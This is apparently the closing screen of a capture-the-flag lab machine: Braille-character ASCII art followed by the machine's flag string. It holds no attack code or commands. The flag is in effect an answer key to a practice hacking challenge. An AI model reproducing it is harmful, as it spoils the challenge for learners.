⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⣻⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⠟⠀⣰⣿⠏⠘⣿⣧⠀⣾⡁⠀⠀⠀⠐⠀⠠⢤⣼⣇⣹⣷⢾⠛⠋⠉⠀⠀⠀⠀⠀⠠⣤⣼⣷⣶⡶⠾⠛⠛⠛⠛⠉⠛⠛⠶⣦⣀⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⣶⣶⣶⣿⣿⣿⣟⣛⡓⠲⢶⣦⣤⣤⣤⣤⣶⣶⣶⣶⢶⣶⣶⣶⠶⠲⣖⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⢶⣶⣶⣶⣶⣶⡶⠶⠾⠿⠃⠀⣰⣿⣋⣀⡀⠈⢿⣷⢸⡟⣶⡶⣶⣶⣶⡿⠿⠛⠉⠁⠀⢀⡀⣀⣀⣤⣶⡶⣶⣿⣿⣟⣉⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠁⢿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠾⣻⣽⠟⠋⠁⠀⠛⠋⠉⢁⢀⣄⣤⠿⠟⠛⠳⠞⢛⢻⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⣻⡿⠟⠛⠉⠉⢋⣩⣴⣾⡿⣫⣿⡿⠶⠟⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠷⠾⣿⣿⣷⠸⣟⠉⠋⠀⢀⠀⣤⣤⣶⠶⠾⠛⣿⣿⡿⠍⣷⡾⠛⠉⠉⠉⠛⣶⢦⣄⡀⠀⠀⢀⣴⢿⡛⠻⢶⡀⣿⣅⠠
⠂⠐⠀⠀⠂⠀⢀⣴⣿⣿⢁⣽⠋⠀⠀⠀⠀⠀⢀⣠⣼⠞⠛⠉⠀⠄⠀⣀⣤⡶⠛⠉⠁⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠀⠀⣀⣤⣶⣿⣿⡿⠿⠛⣙⣃⣤⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠾⠛⠷⢾⣄⠀⢩⣿⠉⢻⣿⣤⣴⠿⠞⠛⠉⠁⠀⠀⠀⠀⠉⠁⠀⠀⣾⠁⠀⠀⠀⠀⢠⡿⠀⠈⠙⠳⣤⡾⣹⣶⣶⣄⠈⣿⣿⣧⢀
⠅⠠⠀⠁⢀⣰⣿⣿⣿⢷⣿⠁⠀⠀⠈⢀⣠⡾⠛⠉⠀⠀⠀⠈⢀⣠⠾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠄⠀⣀⣴⣾⣿⣿⣿⣿⣷⡟⠚⢛⣫⠟⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣰⡿⠋⢠⣀⣀⠀⠀⠙⣧⣾⣿⠷⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⢀⣿⣿⣿⢿⣸⢻⣷⡿⣿⣏⢸
⠀⠐⠀⣰⣿⣿⣿⣿⣿⣿⣃⡀⢀⣤⢞⠋⠁⠀⠀⠀⠀⡀⣤⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⣀⣀⣴⡟⠛⠉⠉⠉⣿⣿⣱⣿⣤⡴⠛⠁⠀⢀⣀⣠⣤⣤⡶⠶⠟⠛⢻⡟⠂⣼⠿⡟⣿⠳⣦⠀⢹⣯⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⢲⡟⠀⠀⠀⢀⣿⣿⣿⣿⣿⣏⣿⣹⣿⣿⣿⢘
⠀⢠⣶⣿⣿⡿⢿⣿⠯⠀⣹⡿⠛⠛⠛⠛⠷⠶⣶⣾⣿⠟⠻⠶⠶⠶⠶⠶⠶⠶⠶⠶⠟⠻⣿⣿⠛⠉⠉⠉⠙⢷⣄⣀⣠⣴⣿⣻⣽⣿⠭⠶⠞⠛⡋⣭⣭⣍⣀⣧⡌⠀⠀⣰⡿⠉⣼⣧⣘⣇⢹⣠⣿⣧⠀⣿⣽⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⢀⣿⠃⠀⠀⢠⣾⣿⣿⣿⡿⣿⡿⠛⠋⣿⣿⡏⠀
⠀⣸⣿⠄⠀⢠⣾⢃⣠⡿⠋⠀⠀⠀⠄⠀⠀⢰⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⣀⣤⡴⠞⠛⠉⠹⠫⣯⣽⣿⣯⣦⡴⠶⠞⠛⠛⠛⠉⠉⠋⣷⣶⣶⣿⣿⣥⣲⡇⠈⢻⣿⣿⡟⣠⡿⡇⢻⢼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡿⠀⠀⠀⠀⢠⣿⣏⣀⠀⠀⣼⡿⣿⢸⣿⡇⠸⣧⣴⡾⢿⣿⡷⠀
⠀⢹⣿⣳⣶⣼⣗⣸⣷⠶⣦⣤⣀⣀⣀⡀⢰⡟⠁⢀⣀⣀⣀⣀⣀⣀⣠⣀⣤⣤⣤⣾⣟⣅⣤⣶⣿⢯⠶⠶⡶⣖⡻⣿⣿⣿⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⣸⣟⢹⣿⠻⣦⣸⣿⡻⣿⣿⣀⣷⢸⣺⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⠖⣿⣇⣀⣀⣤⠞⠛⠁⠈⠍⠛⢺⣿⣶⡏⢸⡿⣧⢠⡟⠛⠻⣾⣿⡏⠀
⠀⢸⣿⠀⡀⠈⠙⠻⢿⣧⠀⠀⠀⠉⠉⠉⠛⠙⠋⠉⠉⠉⠉⠉⠉⠉⠁⠈⢀⠀⢹⡟⠛⣯⣽⣦⡷⠶⠶⠟⠛⠛⠉⠉⠉⢿⡉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡧⢸⣿⠀⣽⣿⣿⣿⣿⠁⠉⣿⣾⣿⡇⠀⠀⠀⢀⣠⣤⣶⣶⣿⣿⣿⣿⠷⠿⠟⠛⠛⠉⠀⠀⠀⠀⠈⠀⠀⠀⣿⢹⡇⢸⣷⣿⣿⢿⣦⡀⣿⣿⠂⠀
⠀⢸⣿⡀⠇⡍⢠⢀⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀⠀⠐⠈⠀⠀⠀⠀⠀⠀⠀⠀⠆⢸⣗⢰⣿⠀⢹⡄⠀⠀⠀⠀⠀⠐⠀⠀⠘⢷⡄⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠁⢸⢿⡞⠋⢙⣿⣡⣾⣿⠉⣿⣿⣿⣷⣶⣿⣿⠿⠿⠛⠋⠉⠉⠁⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢸⡇⠘⢿⣿⣿⡌⣿⣹⣿⡏⠀⠀
⠀⢸⣿⣇⡆⠀⠐⠈⠀⣀⣾⣻⣶⣶⣶⣶⣶⣶⣶⣶⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣼⣿⠛⠻⣆⠈⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠹⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠈⣾⣇⣠⣾⣿⣻⣇⠘⣷⣿⣿⠋⢿⡿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣤⣤⣤⣠⣀⡀⣀⣀⣀⣀⣠⣤⣾⣿⣿⠇⠀⠈⢿⣧⣿⣾⣟⡿⠀⠀⠀
⠀⢸⣿⡍⠟⠷⠶⣤⣼⣿⣿⠿⠿⠿⠿⠿⠿⢿⢿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠙⣧⡀⠙⢶⣶⣶⣿⣟⣿⣟⣟⣚⣓⣿⣤⡼⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⢿⡉⢀⡟⢸⡟⣿⣿⣿⡏⠀⠈⣷⣤⣤⣽⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠙⠙⠉⠉⠉⠉⠿⢯⣌⣀⣀⣀⣀⣉⣿⣽⡿⠁⠀⠀⠀
⠀⠘⠻⢷⣶⣦⣶⣿⣿⣿⣿⣛⣛⡛⡻⢟⠿⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣿⠿⣿⣗⠀⠀⠈⠿⢛⢩⢏⡉⣉⣉⢉⣍⣙⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠈⠿⣾⡇⣸⣡⣿⣷⠟⠛⠛⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀
⠀⢠⠀⠀⠀⠀⠉⠉⠉⠉⠙⠻⠿⢿⣽⣿⣿⣿⣿⣿⣿⡿⠖⠳⠶⠶⠶⠿⠿⠶⠶⠼⠿⠿⠿⠿⠿⠿⠿⠿⠿⠽⠯⠿⠿⠿⠶⠶⠶⠶⠶⠚⠚⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⣆⡀⠀⠀⠀⠉⠙⢻⣭⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢀⠀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡛⠲⠶⢶⣶⣾⣿⣋⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                  HMV{This-was-a-Quick-AND-fast-machine}
```
